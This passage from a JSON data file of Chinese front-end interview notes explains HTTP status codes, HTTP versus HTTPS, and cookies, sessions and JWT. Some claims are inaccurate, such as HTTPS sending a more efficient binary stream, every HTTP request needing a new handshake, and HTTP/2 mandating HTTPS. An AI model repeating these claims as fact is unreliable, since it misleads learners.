Large\n\n服务器无法处理请求，因为标头字段太大。这可能是单个标头字段或所有标头字段存在问题。\n\n#### （27）451 Unavailable For Legal Reasons\n\n服务器的运营商收到了禁止访问请求的资源的要求。\n\n#### （28）499 Client closed request\n\n当 nginx 正在处理请求时，客户端关闭了连接，nginx 就会返回此状态码。\n\n### 5. 5xx Server Error\n\n5XX 的响应结果表明服务器本身发生错误。\n\n#### （1）500 Internal Server Error\n\n服务器端在执行请求时发生了错误。也有可能是应用存在 bug 或某些临时的故障。\n\n#### （2）501 Not Implemented\n\n请求无法处理，因为服务器不支持。\n\n#### （3）502 Bad Gateway\n\n该扮演网关或代理角色的服务器从上游服务器中接收到的响应是无效的。注意，502 错误通常不是客户端能够修复的，而是需要由途经的服务器或者代理服务器对其进行修复\n\n#### （4）503 Service Unavailable\n\n服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。\n\n**使用场景：**\n\n* 服务器停机维护时，主动用503响应请求；\n* nginx 设置限速，超过限速，会返回503。\n\n#### （5）504 Gateway Timeout\n\n网关或者代理的服务器无法在规定的时间内获得想要的响应。它是HTTP 1.1中新加入的。\n\n**使用场景：**\n\n* 代码执行时间超时；\n* 代码发生了死循环。\n\n#### （6）505 HTTP Version Not Supported\n\n请求中使用的 HTTP 版本不受服务器支持。\n\n#### （7）506 Variant Also Negotiates\n\n服务器内部配置错误。\n\n#### （8）507 Insufficient Storage\n\n服务器无法存储完成请求所必须的内容。\n\n#### （9）508 Loop Detected\n\n服务器在处理请求时检测到无限循环。\n\n#### （10）510 Not Extended\n\n服务器需要进一步扩展才能满足请求。\n\n#### （11）511 Network Authentication Required\n\n客户端需要进行身份验证才能获得访问权限。",
    "testPoint": "## 重点状态码含义与应用场景\n\n以下是面试常问的重点状态码及其含义：\n\n* `200 OK`：请求成功（最常见）\n* `201 Created`：资源创建成功（如 POST 新建）\n* `204 No Content`：请求成功但无返回内容（如 DELETE）\n* `301` / `302`：重定向，前者为永久，后者为临时（SEO 优化相关）\n* `304 Not Modified`：缓存优化场景（结合 ETag / Last-Modified）\n* `400 Bad Request`：请求语法错误，如参数不合法\n* `401 Unauthorized`：未认证，通常要求登录或提供 token\n* `403 Forbidden`：已认证但无权限访问\n* `404 Not Found`：资源不存在，常用于错误页面\n* `429 Too Many Requests`：请求频率过高，通常用于限流策略\n* `500 Internal Server Error`：服务端异常，前端应展示友好提示\n* `502 Bad Gateway` / `503 Service Unavailable`：网关错误、服务不可用，通常和反向代理或负载均衡相关\n\n## 常见考察点\n\n### 1. **缓存控制与状态码**\n\n* `304 Not Modified` 如何触发？\n* `Cache-Control`、`ETag`、`Last-Modified` 的协作原理？\n\n### 2. **认证与权限处理**\n\n* 登录失效后服务器返回 `401`，前端应如何处理？\n* 如何区分 `401` 与 `403`？\n\n### 3. **错误处理机制**\n\n* 如何统一处理 `4xx`/`5xx` 错误？\n* 前端是否应展示后端返回的错误信息？应如何处理？\n\n### 4. **重定向场景**\n\n* `302` 与 JS `location.href` 的区别？\n* 在接口返回 `302` 时，浏览器是如何处理的？\n\n### 5. **限流与降级策略**\n\n* 收到 `429` 应如何处理？\n* 如何在前端侧配合节流、重试、退避机制？\n\n## 进阶问题（高级面试中常见）\n\n* 如果前端 fetch 接口请求返回了 `204`，应该怎么处理？\n* 前端如何判断 `301` 是浏览器行为还是服务端重定向？\n* SSR 场景中状态码该如何处理（例如 `404` 页面）？\n",
    "exerciseKeyList": "[\"2ac9dc59-86fe-4c0c-9e5e-93a5d92b8513\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-07-28T03:43:01.000Z",
    "updateAt": "2025-08-07T11:53:02.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "2ac9dc59-86fe-4c0c-9e5e-93a5d92b8513",
        "title": "HTTP状态码",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T15:56:11.000Z",
        "updateAt": "2024-07-19T18:05:33.000Z"
      }
    ]
  },
  "225": {
    "id": 225,
    "tagId": 16,
    "title": "http和https",
    "explanation": "## HTTP\n\n### 基础\n\nHTTP 超文本传输协议 ，应用层协议。主要用于 Web 上传输超媒体文本的底层协议，经常在浏览器和服务器之间传递数据。通信就是以纯文本的形式进行。\n\n### HTTP 是无状态\n\n无状态是 HTTP 协议对客户端请求状态没有进行存储，比如每次请求都需要重新登录\n\n### HTTP 是无连接\n\n无连接主要是限制每次连接只处理一个请求。每次请求都是客户发起请求，服务端响应请求，然后就断开连接。这期间就是通过三次握手建立连接，四次挥手断开连接。每次请求即便是多次请求并请求同一个资源，服务端都无法判断是否是相同请求，都需要重新响应请求。\n\n所以，为了解决客户端和服务端保持会话连接，通过 cookie 和 session 来记录 http 状态。\n\nHTTP 的其他特点是简单快速，只需传送方法和路径就可以向服务端进行请求；还有支持传输任意类型的数据对象。\n\n## HTTPS\n\n### 基础\n\nhttps 是 http 的“升级”版本：\n\n```\nHTTPS = HTTP+ SSL/TLS\n\n```\n\nSSL 是安全层，TLS 是传输层安全，是SSL 的继承。使用SSL或TLS 可确保传输数据的安全性。\n\n使用 HTTP 可能看到传输数据是： “这是明文信息”\n\n使用 HTTPS 可能看到： “283hd9saj9cdsncihquhs99ndso”\n\nHTTPS 传输的不再是文本，而是二进制流，使得传输更高效，且加密处理更加安全。\n\n### HTTPS 的工作流程\n\n1、客户端请求 HTTPS 请求并连接到服务器的 443 端口，此过程和请求 HTTP 请求一样，进行三次握手；\n\n2、服务端向客户端发送数字证书，其中包含公钥、证书颁发者、到期日期\n\n现比较流行的加解密码对，即公钥和私钥。公钥用于加密，私钥用于解密。所以服务端会保留私钥，然后发送公钥给客户端。\n\n3、客户端收到证书，会验证证书的有效性。验证通过后会生成一个随机的 pre-master key。再将密钥通过接收到的公钥加密然后发送给服务端\n\n4、服务端接收后使用私钥进行解密得到 pre-master key\n\n5、获得 pre-master key 后，服务器和客户端可以使用主密钥进行通信。\n\n## HTTP 与 HTTPS 区别\n\n所以在回答 HTTP 与 HTTPS 的区别的问题，可以从下面几个方面进行回答：\n\n* 加密： HTTPS 是 HTTP 协议的更加安全的版本，通过使用SSL/TLS进行加密传输的数据；\n* 连接方式： HTTP（三次握手）和 HTTPS （三次握手+数字证书）连接方式不一样；\n* 端口： HTTP 默认的端口是 80和 HTTPS 默认端口是 443\n\n## HTTP2 是什么？\n\nHTTP/2 超文本传输协议第2版，是 HTTP/1.x 的扩展。所以 HTTP/2没有改动HTTP的应用语义，仍然使用HTTP的请求方法、状态码和头字段等规则。\n\n它主要修改了HTTP的报文传输格式，通过引入二进制分帧层实现性能的提升。\n\n现有很多主流浏览器的 HTTPS/2 的实现都是基于SSL/TLS的，所以基于 SSL/TLS 的 HTTP/2 连接建立过程和 HTTPS 差不多。在建立连接过程中会携带标识期望使用 HTTP/2 协议，服务端同样方式回应。",
    "testPoint": "### 一、基础概念类\n\n| 考点                | 说明                         |\n| ----------------- | -------------------------- |\n| HTTP 是什么？         | 超文本传输协议，无状态、明文传输           |\n| HTTPS 是什么？        | 在 HTTP 上加入 TLS/SSL 加密的安全协议 |\n| HTTP 和 HTTPS 的端口号 | HTTP 默认 80，HTTPS 默认 443    |\n\n### 二、HTTP 与 HTTPS 的区别\n\n| 维度   | 区别点                                 |\n| ---- | ----------------------------------- |\n| 安全性  | HTTP 明文传输，HTTPS 加密传输（TLS）           |\n| 证书机制 | HTTPS 需要数字证书（CA签发）                  |\n| 性能   | HTTPS 初次连接需 TLS 握手，耗时更长，但可启用 HTTP/2 |\n| SEO  | 搜索引擎优先抓取 HTTPS 页面                   |\n| 防劫持  | HTTPS 可防止运营商插入广告，防止中间人攻击            |\n\n### 三、HTTPS 的加密原理\n\n| 考点           | 说明                                  |\n| ------------ | ----------------------------------- |\n| 对称加密         | 传输数据（快，但密钥要安全传输）                    |\n| 非对称加密        | 用于传输对称密钥（RSA，较慢）                    |\n| TLS/SSL 握手流程 | 客户端发起请求 → 服务端返回证书 → 协商加密套件 → 建立安全连接 |\n| 数字证书         | 验证服务端身份，防止钓鱼网站                      |\n\n### 四、HTTP 演进相关\n\n| 考点                 | 说明                                 |\n| ------------------ | ---------------------------------- |\n| HTTP/1.0、1.1       | 1.1 支持长连接（keep-alive）、分块传输、缓存机制更完善 |\n| HTTP/2             | 多路复用、首部压缩、服务器推送，提高性能               |\n| HTTP/3             | 基于 QUIC 协议，减少握手延迟，适合弱网环境           |\n| HTTPS 与 HTTP/2 的关系 | HTTP/2 强制使用 HTTPS                  |\n\n### 五、常见安全问题\n\n| 问题     | HTTPS 处理情况                          |\n| ------ | ----------------------------------- |\n| 中间人攻击  | HTTPS 可防止，数据加密且验证证书                 |\n| DNS 劫持 | 仍可能发生，HTTPS 无法防止 DNS 被篡改，但 DoH 可以解决 |\n| 数据篡改   | HTTPS 提供完整性验证（MAC）防止篡改              |\n\n\n### 六、证书相关\n\n| 考点      | 说明                |\n| ------- | ----------------- |\n| CA 机构   | 签发数字证书的权威机构       |\n| 自签名证书   | 浏览器会报不可信          |\n| 证书包含内容  | 公钥、域名、有效期、颁发者、指纹等 |\n| 浏览器信任机制 | 通过内置的 CA 根证书链进行验证 |\n\n### 七、实际开发中相关问题\n\n| 问题                        | 说明                                  |\n| ------------------------- | ----------------------------------- |\n| HTTPS 页面中使用 HTTP 资源（混合内容） | 浏览器会警告或阻止加载                         |\n| 前后端接口跨域问题                 | HTTPS 与 HTTP 跨协议时需注意 CORS 和 HSTS 配置 |\n| HSTS                      | 强制浏览器使用 HTTPS 访问                    |\n| 使用 HTTPS 后访问变慢            | TLS 握手耗时，可通过缓存连接、启用 HTTP/2、优化证书链来缓解 |\n\n### 八、扩展：HTTPS 优化技巧（高阶）\n\n| 技巧                           | 说明              |\n| ---------------------------- | --------------- |\n| 使用 CDN 加速 HTTPS              | 减少跨地区 TLS 握手延迟  |\n| TLS 会话缓存（Session Resumption） | 提高复用率，减少重新握手    |\n| OCSP Stapling                | 减少证书状态验证的 RTT   |\n| 启用 ALPN 协商                   | 支持 HTTP/2/3 的前提 |",
    "exerciseKeyList": "[\"88f3b671-5906-4aa8-9f68-8df711d582f3\",\"4ce73150-a0ff-495a-a669-191b7bd7c830\",\"748b2bec-7e35-4d5b-81e1-c6fb29f00464\",\"8740bcd2-4a52-4c22-aed1-d573eb42dfa9\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-07-28T03:48:05.000Z",
    "updateAt": "2025-08-07T11:54:44.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "4ce73150-a0ff-495a-a669-191b7bd7c830",
        "title": "HTTP和HTTPS的区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T15:45:43.000Z",
        "updateAt": "2024-07-19T18:16:19.000Z"
      },
      {
        "exerciseKey": "748b2bec-7e35-4d5b-81e1-c6fb29f00464",
        "title": "HTTPS 有哪些优点？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:58:29.000Z",
        "updateAt": "2024-08-10T17:04:57.000Z"
      },
      {
        "exerciseKey": "8740bcd2-4a52-4c22-aed1-d573eb42dfa9",
        "title": "HTTPS 为什么是安全的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T04:48:54.000Z",
        "updateAt": "2024-08-10T17:05:23.000Z"
      },
      {
        "exerciseKey": "88f3b671-5906-4aa8-9f68-8df711d582f3",
        "title": "HTTPS 加密算法和加解密过程是啥？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:31:49.000Z"
      }
    ]
  },
  "226": {
    "id": 226,
    "tagId": 16,
    "title": "Cookie 和 Session",
    "explanation": "## Cookie 和 Session\n\nHTTP 协议是一种`无状态协议`，即每次服务端接收到客户端的请求时，都是一个全新的请求，服务器并不知道客户端的历史请求记录；Session 和 Cookie 的主要目的就是为了弥补 HTTP 的无状态特性。\n\n### Session 是什么\n\n客户端请求服务端，服务端会为这次请求开辟一块`内存空间`，这个对象便是 Session 对象，存储结构为 `ConcurrentHashMap`。Session 弥补了 HTTP 无状态特性，服务器可以利用 Session 存储客户端在同一个会话期间的一些操作记录。\n\n### Session 如何判断是否是同一会话\n\n服务器第一次接收到请求时，开辟了一块 Session 空间（创建了Session对象），同时生成一个 sessionId ，并通过响应头的 \\*\\*Set-Cookie：JSESSIONID=XXXXXXX \\*\\*命令，向客户端发送要求设置 Cookie 的响应； 客户端收到响应后，在本机客户端设置了一个 **JSESSIONID=XXXXXXX** 的 Cookie 信息，该 Cookie 的过期时间为浏览器会话结束；\n\n![](https://static.ecool.fun//article/46c2e4a0-4fe9-4e80-96ad-4527ba962578.png)\n\n接下来客户端每次向同一个网站发送请求时，请求头都会带上该 Cookie信息（包含 sessionId ）， 然后，服务器通过读取请求头中的 Cookie 信息，获取名称为 JSESSIONID 的值，得到此次请求的 sessionId。\n\n### Session 的缺点\n\nSession 机制有个缺点，比如 A 服务器存储了 Session，就是做了负载均衡后，假如一段时间内 A 的访问量激增，会转发到 B 进行访问，但是 B 服务器并没有存储 A 的 Session，会导致 Session 的失效。\n\n### Cookies 是什么\n\nHTTP 协议中的 Cookie 包括 `Web Cookie` 和`浏览器 Cookie`，它是服务器发送到 Web 浏览器的一小块数据。服务器发送到浏览器的 Cookie，浏览器会进行存储，并与下一个请求一起发送到服务器。通常，它用于判断两个请求是否来自于同一个浏览器，例如用户保持登录状态。\n\n> HTTP Cookie 机制是 HTTP 协议无状态的一种补充和改良\n\nCookie 主要用于下面三个目的\n\n* `会话管理`\n\n登陆、购物车、游戏得分或者服务器应该记住的其他内容\n\n* `个性化`\n\n用户偏好、主题或者其他设置\n\n* `追踪`\n\n记录和分析用户行为\n\nCookie 曾经用于一般的客户端存储。虽然这是合法的，因为它们是在客户端上存储数据的唯一方法，但如今建议使用现代存储 API。Cookie 随每个请求一起发送，因此它们可能会降低性能（尤其是对于移动数据连接而言）。\n\n### 创建 Cookie\n\n当接收到客户端发出的 HTTP 请求时，服务器可以发送带有响应的 `Set-Cookie` 标头，Cookie 通常由浏览器存储，然后将 Cookie 与 HTTP 标头一同向服务器发出请求。\n\n#### Set-Cookie 和 Cookie 标头\n\n`Set-Cookie` HTTP 响应标头将 cookie 从服务器发送到用户代理。下面是一个发送 Cookie 的例子\n\n![](https://static.ecool.fun//article/3157d225-73de-45e4-ba5a-773476c18e3f.png)\n\n此标头告诉客户端存储 Cookie\n\n现在，随着对服务器的每个新请求，浏览器将使用 Cookie 头将所有以前存储的 Cookie 发送回服务器。\n\n![](https://static.ecool.fun//article/c55f02be-e234-412e-97ec-f6c1fc3682ae.png)\n\n有两种类型的 Cookies，一种是 Session Cookies，一种是 Persistent Cookies，如果 Cookie 不包含到期日期，则将其视为会话 Cookie。会话 Cookie 存储在内存中，永远不会写入磁盘，当浏览器关闭时，此后 Cookie 将永久丢失。如果 Cookie 包含`有效期` ，则将其视为持久性 Cookie。在到期指定的日期，Cookie 将从磁盘中删除。\n\n还有一种是 `Cookie的 Secure 和 HttpOnly 标记`，下面依次来介绍一下\n\n#### 会话 Cookies\n\n上面的示例创建的是会话 Cookie ，会话 Cookie 有个特征，客户端关闭时 Cookie 会删除，因为它没有指定`Expires`或 `Max-Age` 指令。\n\n但是，Web 浏览器可能会使用会话还原，这会使大多数会话 Cookie 保持永久状态，就像从未关闭过浏览器一样。\n\n#### 永久性 Cookies\n\n永久性 Cookie 不会在客户端关闭时过期，而是在`特定日期（Expires）`或`特定时间长度（Max-Age）`外过期。例如\n\n```\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n\n```\n\n#### Cookie 的 Secure 和 HttpOnly 标记\n\n安全的 Cookie 需要经过 HTTPS 协议通过加密的方式发送到服务器。即使是安全的，也不应该将敏感信息存储在cookie 中，因为它们本质上是不安全的，并且此标志不能提供真正的保护。\n\n**HttpOnly 的作用**\n\n* 会话 Cookie 中缺少 HttpOnly 属性会导致攻击者可以通过程序(JS脚本、Applet等)获取到用户的 Cookie 信息，造成用户 Cookie 信息泄露，增加攻击者的跨站脚本攻击威胁。\n* HttpOnly 是微软对 Cookie 做的扩展，该值指定 Cookie 是否可通过客户端脚本访问。\n* 如果在 Cookie 中没有设置 HttpOnly 属性为 true，可能导致 Cookie 被窃取。窃取的 Cookie 可以包含标识站点用户的敏感信息，如 ASP.NET 会话 ID 或 Forms 身份验证票证，攻击者可以重播窃取的 Cookie，以便伪装成用户或获取敏感信息，进行跨站脚本攻击等。\n\n### Cookie 的作用域\n\n`Domain` 和 `Path` 标识定义了 Cookie 的作用域：即 Cookie 应该发送给哪些 URL。\n\n`Domain` 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前主机(**不包含子域名**）。如果指定了`Domain`，则一般包含子域名。\n\n例如，如果设置 `Domain=mozilla.org`，则 Cookie 也包含在子域名中（如`developer.mozilla.org`）。\n\n例如，设置 `Path=/docs`，则以下地址都会匹配：\n\n* `/docs`\n* `/docs/Web/`\n* `/docs/Web/HTTP`\n\n## JSON Web Token 和 Session Cookies 的对比\n\n`JSON Web Token ，简称 JWT`，它和 `Session`都可以为网站提供用户的身份认证，但是它们不是一回事。\n\n下面是 JWT 和 Session 不同之处的研究\n\n### JWT 和 Session Cookies 的相同之处\n\n在探讨 JWT 和 Session Cookies 之前，有必要需要先去理解一下它们的相同之处。\n\n它们既可以对用户进行身份验证，也可以用来在用户单击进入不同页面时以及登陆网站或应用程序后进行身份验证。\n\n如果没有这两者，那你可能需要在每个页面切换时都需要进行登录了。因为 HTTP 是一个无状态的协议。这也就意味着当你访问某个网页，然后单击同一站点上的另一个页面时，服务器的`内存中`将不会记住你之前的操作。\n\n![](https://static.ecool.fun//article/7415f66e-ac3e-447c-9896-2d99db74afe7.png)\n\n因此，如果你登录并访问了你有权访问的另一个页面，由于 HTTP 不会记录你刚刚登录的信息，因此你将再次登录。\n\n**JWT 和 Session Cookies 就是用来处理在不同页面之间切换，保存用户登录信息的机制**。\n\n也就是说，这两种技术都是用来保存你的登录状态，能够让你在浏览任意受密码保护的网站。通过在每次产生新的请求时对用户数据进行身份验证来解决此问题。\n\n所以 JWT 和 Session Cookies 的相同之处是什么？那就是它们能够支持你在发送不同请求之间，记录并验证你的登录状态的一种机制。\n\n### 什么是 Session Cookies\n\nSession Cookies 也称为`会话 Cookies`，在 Session Cookies 中，用户的登录状态会保存在`服务器`的`内存`中。当用户登录时，Session 就被服务端安全的创建。\n\n在每次请求时，服务器都会从会话 Cookie 中读取 SessionId，如果服务端的数据和读取的 SessionId 相同，那么服务器就会发送响应给浏览器，允许用户登录。\n\n![](https://static.ecool.fun//article/39c57c74-6d51-44e6-871d-bf04693b184e.png)\n\n### 什么是 Json Web Tokens\n\nJson Web Token 的简称就是 JWT，通常可以称为 `Json 令牌`。它是`RFC 7519` 中定义的用于`安全的`将信息作为 `Json 对象`进行传输的一种形式。JWT 中存储的信息是经过`数字签名`的，因此可以被信任和理解。可以使用 HMAC 算法或使用 RSA/ECDSA 的公用/专用密钥对 JWT 进行签名。\n\n使用 JWT 主要用来下面两点\n\n* `认证(Authorization)`：这是使用 JWT 最常见的一种情况，一旦用户登录，后面每个请求都会包含 JWT，从而允许用户访问该令牌所允许的路由、服务和资源。`单点登录`是当今广泛使用 JWT 的一项功能，因为它的开销很小。\n* `信息交换(Information Exchange)`：JWT 是能够安全传输信息的一种方式。通过使用公钥/私钥对 JWT 进行签名认证。此外，由于签名是使用 `head` 和 `payload` 计算的，因此你还可以验证内容是否遭到篡改。\n\n#### JWT 的格式\n\n下面，我们会探讨一下 JWT 的组成和格式是什么\n\nJWT 主要由三部分组成，每个部分用 `.` 进行分割，各个部分分别是\n\n* `Header`\n* `Payload`\n* `Signature`\n\n因此，一个非常简单的 JWT 组成会是下面这样\n\n![](https://static.ecool.fun//article/a907a77b-543a-48e2-8677-5014841b24d4.png)\n\n然后我们分别对不同的部分进行探讨。\n\n**Header**\n\nHeader 是 JWT 的标头，它通常由两部分组成：`令牌的类型(即 JWT)`和使用的 `签名算法`，例如 HMAC SHA256 或 RSA。\n\n例如\n\n```\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n\n```\n\n指定类型和签名算法后，Json 块被 `Base64Url` 编码形成 JWT 的第一部分。\n\n**Payload**\n\nToken 的第二部分是 `Payload`，Payload 中包含一个声明。声明是有关实体（通常是用户）和其他数据的声明。共有三种类型的声明：**registered, public 和 private** 声明。\n\n* `registered 声明`： 包含一组建议使用的预定义声明，主要包括\n\n| ISS | 签发人 |\n| --- | --- |\n| iss (issuer) | 签发人 |\n| exp (expiration time) | 过期时间 |\n| sub (subject) | 主题 |\n| aud (audience) | 受众 |\n| nbf (Not Before) | 生效时间 |\n| iat (Issued At) | 签发时间 |\n| jti (JWT ID) | 编号 |\n\n* `public 声明`：公共的声明，可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息，但不建议添加敏感信息，因为该部分在客户端可解密。\n* `private 声明`：自定义声明，旨在在同意使用它们的各方之间共享信息，既不是注册声明也不是公共声明。\n\n例如\n\n```\n{\n  \"sub\": \"1234567890\",\n  \"name\": \"John Doe\",\n  \"admin\": true\n}\n\n```\n\n然后 payload Json 块会被`Base64Url` 编码形成 JWT 的第二部分。\n\n**signature**\n\nJWT 的第三部分是一个签证信息，这个签证信息由三部分组成\n\n* header (base64后的)\n* payload (base64后的)\n* secret\n\n比如我们需要 HMAC SHA256 算法进行签名\n\n```\nHMACSHA256(\n  base64UrlEncode(header) + \".\" +\n  base64UrlEncode(payload),\n  secret)\n\n```\n\n签名用于验证消息在此过程中没有更改，并且对于使用私钥进行签名的令牌，它还可以验证 JWT 的发送者的真实身份\n\n#### 拼凑在一起\n\n现在我们把上面的三个由点分隔的 Base64-URL 字符串部分组成在一起，这个字符串可以在 HTML 和 HTTP 环境中轻松传递这些字符串。\n\n下面是一个完整的 JWT 示例，它对 header 和 payload 进行编码，然后使用 signature 进行签名\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\n\n```\n\n![](https://static.ecool.fun//article/b8079186-4b71-4b38-9674-1365d0b19a59.png)\n\n如果想自己测试编写的话，可以访问 JWT 官网 [jwt.io/#debugger-i…](https://link.juejin.cn?target=https%3A%2F%2Fjwt.io%2F%23debugger-io \"https://jwt.io/#debugger-io\")\n\n### JWT 和 Session Cookies 的不同\n\nJWT 和 Session Cookies 都提供安全的用户身份验证，但是它们有以下几点不同\n\n#### 密码签名\n\nJWT 具有加密签名，而 Session Cookies 则没有。\n\n#### JSON 是无状态的\n\nJWT 是`无状态`的，因为声明被存储在`客户端`，而不是服务端内存中。\n\n身份验证可以在`本地`进行，而不是在请求必须通过服务器数据库或类似位置中进行。 这意味着可以对用户进行多次身份验证，而无需与站点或应用程序的数据库进行通信，也无需在此过程中消耗大量资源。\n\n#### 可扩展性\n\nSession Cookies 是存储在服务器内存中，这就意味着如果网站或者应用很大的情况下会耗费大量的资源。由于 JWT 是无状态的，在许多情况下，它们可以节省服务器资源。因此 JWT 要比 Session Cookies 具有更强的`可扩展性`。\n\n#### JWT 支持跨域认证\n\nSession Cookies 只能用在`单个节点的域`或者它的`子域`中有效。如果它们尝试通过第三个节点访问，就会被禁止。如果你希望自己的网站和其他站点建立安全连接时，这是一个问题。\n\n使用 JWT 可以解决这个问题，使用 JWT 能够通过`多个节点`进行用户认证，也就是我们常说的`跨域认证`。\n\n### JWT 和 Session Cookies 的选型\n\n我们上面探讨了 JWT 和 Cookies 的不同点，相信你也会对选型有了更深的认识，大致来说\n\n对于只需要登录用户并访问存储在站点数据库中的一些信息的中小型网站来说，Session Cookies 通常就能满足。\n\n如果你有企业级站点，应用程序或附近的站点，并且需要处理大量的请求，尤其是第三方或很多第三方（包括位于不同域的API），则 JWT 显然更适合。",
    "testPoint": "**Cookie 与 Session** 是前端与后端交互中绕不开的经典考点，常用于**身份验证、状态保持、存储机制、安全控制**等场景。\n\n## 一、基础定义与区别（核心考点）\n\n| 对比维度 | Cookie               | Session                    |\n| ---- | -------------------- | -------------------------- |\n| 存储位置 | **客户端（浏览器）**         | **服务端（内存、数据库等）**           |\n| 本质   | 一段 **键值对文本信息**       | 一个 **服务端维护的状态标识**          |\n| 生命周期 | 默认会话级，支持设置过期时间       | 一般是浏览器关闭或超时后销毁             |\n| 大小限制 | 单个域名下最多 4KB          | 理论不限，但受服务端资源限制             |\n| 安全性  | 容易被劫持、伪造，依赖 HTTPS 保护 | 相对安全，但需防止 Session Fixation |\n| 使用场景 | 状态保持、轻量存储、前后端身份标识    | 登录认证、权限控制、用户状态管理           |\n\n## 二、Cookie 的重点考察点\n\n### 1. Cookie 属性字段\n\n| 字段                    | 说明                         |\n| --------------------- | -------------------------- |\n| `name=value`          | 键值对数据                      |\n| `domain`              | 指定允许访问的域（如 `.example.com`） |\n| `path`                | 限制 Cookie 生效路径             |\n| `expires` / `max-age` | 控制过期时间                     |\n| `secure`              | 仅 HTTPS 才发送                |\n| `HttpOnly`            | JavaScript 无法读取，提高安全性      |\n| `SameSite`            | 防止跨站请求伪造（CSRF）攻击           |\n\n### 2. Cookie 设置方式\n\n* 后端设置（`Set-Cookie` 响应头）\n* 前端设置（`document.cookie = \"key=value\"`，受限制）\n\n### 3. Cookie 的跨域规则\n\n* 默认只发送到设置域及其子域\n* 跨域访问需使用 `Access-Control-Allow-Credentials: true` 且 `withCredentials = true`\n\n## 三、Session 的重点考察点\n\n### 1. Session 原理\n\n* 每个客户端分配一个唯一的 `sessionId`\n* 客户端通过 Cookie（默认名如 `JSESSIONID`）将 ID 发送给服务端\n* 服务端用 `sessionId` 找到对应的状态数据（如用户信息）\n\n### 2. 存储方式\n\n| 方式        | 说明               |\n| --------- | ---------------- |\n| 内存        | 快速，但不适合分布式（重启丢失） |\n| 文件系统      | 简单可靠，性能一般        |\n| 数据库/Redis | 支持持久化和分布式，性能好    |\n\n### 3. 安全风险\n\n* **Session Fixation**：攻击者预设 sessionId 引导用户登录\n* **Session 劫持**：中间人截获 sessionId\n* 解决方式：\n\n  * 登录成功后重置 sessionId\n  * 配合 HTTPS、防止 sessionId 泄露\n\n## 四、Session 与 Cookie 配合使用\n\n* **Session 通常依赖 Cookie 来传递 `sessionId`**\n* Cookie 负责持久化保存 ID，Session 负责保存服务端用户状态\n* 无 Cookie 时（如某些小程序、无状态 API），可用 token（如 JWT）替代\n\n## 五、延伸考点：Token 与 Session 对比\n\n| 对比点   | Session   | Token（如 JWT）                    |\n| ----- | --------- | ------------------------------- |\n| 存储位置  | 服务端       | 客户端（通常存在 Cookie 或 LocalStorage） |\n| 状态管理  | 有状态       | 无状态                             |\n| 分布式支持 | 一般不友好     | 天然支持                            |\n| 安全性   | 不易伪造，但易劫持 | 签名机制防篡改，失效控制难                   |\n| 实现复杂度 | 简单        | 略复杂（涉及签名/验证）                    |\n\n## 六、常见面试问题示例\n\n| 问题                             | 涉及考点                               |\n| ------------------------------ | ---------------------------------- |\n| Cookie 与 Session 的区别？          | 存储位置、状态管理、安全性                      |\n| Cookie 有哪些关键属性？如何防止被窃取？        | HttpOnly、Secure、SameSite           |\n| Session 是如何实现的？和 Cookie 有什么关系？ | sessionId、状态记录                     |\n| Cookie 为什么有大小限制？               | 浏览器规范限制（4KB）                       |\n| 前端如何设置 Cookie？                 | `document.cookie` 注意 path 和 domain |\n| Session 是如何在分布式架构中管理的？         | 使用 Redis、数据库共享                     |\n| 如何防止 Session Fixation？         | 登录后更换 sessionId                    |\n| 使用 token 和 session 管理登录有什么差别？  | 状态 vs 无状态，扩展性 vs 安全控制              |",
    "exerciseKeyList": "[\"8a109788-5551-44a0-ba39-526632145959\",\"a6c99a3d-88a1-4806-8443-89368f608ba1\",\"31809048-eda0-40d6-847a-0d04d28b6432\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-07-28T03:52:36.000Z",
    "updateAt": "2025-08-06T07:55:56.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "31809048-eda0-40d6-847a-0d04d28b6432",
        "title": "请说说cookie与session有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T13:53:28.000Z",
        "updateAt": "2024-08-10T17:05:12.000Z"
      },
      {
        "exerciseKey": "8a109788-5551-44a0-ba39-526632145959",
        "title": "cookie 构成部分有哪些",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T19:17:33.000Z"
      },
      {
        "exerciseKey": "a6c99a3d-88a1-4806-8443-89368f608ba1",
        "title": "使用cookie、session维持登录状态的原理是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T09:35:18.000Z",
        "updateAt": "2024-08-10T17:05:47.000Z"
      }
    ]
  },
  "234": {
    "id": 234,
    "tagId": 16,
    "title": "跨域相关",
